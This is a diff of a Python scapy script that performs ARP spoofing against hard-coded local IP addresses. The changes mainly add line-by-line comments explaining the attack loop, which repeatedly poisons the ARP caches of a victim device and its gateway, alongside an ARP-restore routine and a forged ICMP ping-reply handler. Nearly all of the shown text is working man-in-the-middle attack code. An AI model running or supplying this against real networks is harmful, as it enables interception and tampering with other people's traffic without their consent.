@@ -21,28 +21,28 @@ def restore(destination_ip, source_ip):                 # restore the ARP cache
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, verbose=False)                   # sends the ARP response packet
 
 def ping_reply(packet):
-    if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # check if the packet is an ICMP ping request
-        src_ip = packet[IP].src
-        dst_ip = packet[IP].dst
-        src_mac = packet[Ether].src
-        dst_mac = packet[Ether].dst
+    if packet.haslayer(ICMP) and packet[ICMP].type == 8: # check if the packet is an ICMP ping request
+        src_ip = packet[IP].src                          # assigns the source IP address of the packet   
+        dst_ip = packet[IP].dst                          # assigns the dest IP address of the packet  
+        src_mac = packet[Ether].src                      # assigns the source MAC
+        dst_mac = packet[Ether].dst                      # assigns the dest MAC
         """Craft an ICMP ping reply using the same parameters as the request"""
         reply = Ether(src=dst_mac, dst=src_mac) / IP(src=dst_ip, dst=src_ip) / ICMP(type=0)
-        scapy.send(reply, verbose=False) # Send the reply
+        scapy.send(reply, verbose=False)                # Send the reply
 
 target_ip = "192.168.0.196" 
 gateway_ip = "192.168.0.50" 
 
 """Start the spoofing attack""" 
 try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
+    sent_packets_count = 0                              # init a counter for the number of packets sent
+    while True:                                         # keep sending ARP spoofing packets until interrupted
+        spoof(target_ip, gateway_ip)                    # send an ARP spoofing packet to the victim device
+        spoof(gateway_ip, target_ip)                    # send an ARP spoofing packet to the gateway
+        sent_packets_count = sent_packets_count + 2     # two packets sent
         print("\r[*] Packets Sent "+str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
